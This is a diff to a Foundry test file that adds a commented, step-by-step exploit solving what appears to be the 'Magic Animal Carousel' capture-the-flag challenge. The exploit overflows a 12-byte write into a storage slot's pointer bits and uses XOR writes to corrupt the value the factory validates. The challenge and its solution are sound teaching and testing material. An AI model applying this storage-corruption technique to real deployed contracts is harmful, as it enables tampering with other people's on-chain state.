@@ -2,7 +2,7 @@
 pragma solidity ^0.8.28;
 
 import {Test, console} from "forge-std/Test.sol";
-import {MagicAnimalCarousel} from "../src/challenge-33-magic-animal-carousel/MagicAnimalCarousel.sol";
+import {MagicAnimalCarousel} from "../../src/challenge-33-magic-animal-carousel/MagicAnimalCarousel.sol";
 
 contract MagicAnimalCarouselTest is Test {
     MagicAnimalCarousel carousel;
@@ -149,5 +149,78 @@ contract MagicAnimalCarouselTest is Test {
         assertEq(crate27502, uint256(0x6d6e6f707172737475766b6fecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));
 
         vm.stopPrank();
+    }
+
+    function testSolveMagicAnimalCarousel() public {
+        vm.startPrank(user);
+
+        // ------------------------------------------------------------
+        // Step 1: add a normal animal
+        // This writes into crate 1 and makes currentCrateId = 1.
+        // ------------------------------------------------------------
+        carousel.setAnimalAndSpin("abcdefghij");
+
+        assertEq(carousel.currentCrateId(), 1);
+
+        // ------------------------------------------------------------
+        // Step 2: corrupt crate 1 with a 12-byte animal made of 0xff bytes.
+        //
+        // changeAnimal() writes 12 bytes starting at bit 160.
+        // The last 2 bytes overlap with nextId.
+        //
+        // This sets crate 1 nextId to 0xffff = 65535.
+        // ------------------------------------------------------------
+        string memory corruptedAnimal = string(abi.encodePacked(bytes12(type(uint96).max)));
+
+        carousel.changeAnimal(corruptedAnimal, 1);
+
+        uint256 crate1AfterCorruption = carousel.carousel(1);
+
+        assertEq(crate1AfterCorruption, uint256(0xffffffffffffffffffffffffecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));
+
+        assertEq(carousel.currentCrateId(), 1);
+
+        // ------------------------------------------------------------
+        // Step 3: spin again.
+        //
+        // setAnimalAndSpin() reads nextId from crate 1.
+        // Since we corrupted it to 65535, the next write goes to crate 65535.
+        //
+        // The new nextId stored inside crate 65535 becomes:
+        // (65535 + 1) % 65535 = 1
+        //
+        // So crate 65535 now points back to crate 1.
+        // ------------------------------------------------------------
+        carousel.setAnimalAndSpin("mnopqrstuv");
+
+        assertEq(carousel.currentCrateId(), 65535);
+
+        uint256 crate65535 = carousel.carousel(65535);
+
+        assertEq(crate65535, uint256(0x6d6e6f707172737475760001ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0));
+
+        vm.stopPrank();
+
+        // ------------------------------------------------------------
+        // Step 4: simulate the factory validation.
+        //
+        // The factory calls setAnimalAndSpin("Goat").
+        // Since currentCrateId is 65535, the function reads nextId = 1
+        // and writes "Goat" into crate 1.
+        //
+        // But crate 1 already contains dirty animal bits.
+        // Because setAnimalAndSpin() uses XOR instead of replacing the animal,
+        // the stored animal becomes different from "Goat".
+        // ------------------------------------------------------------
+        string memory goat = "Goat";
+
+        carousel.setAnimalAndSpin(goat);
+
+        uint256 currentCrateId = carousel.currentCrateId();
+        uint256 animalInBox = carousel.carousel(currentCrateId) >> 176;
+        uint256 goatEnc = uint256(bytes32(abi.encodePacked(goat))) >> 176;
+
+        assertEq(currentCrateId, 1);
+        assertTrue(animalInBox != goatEnc);
     }
 }
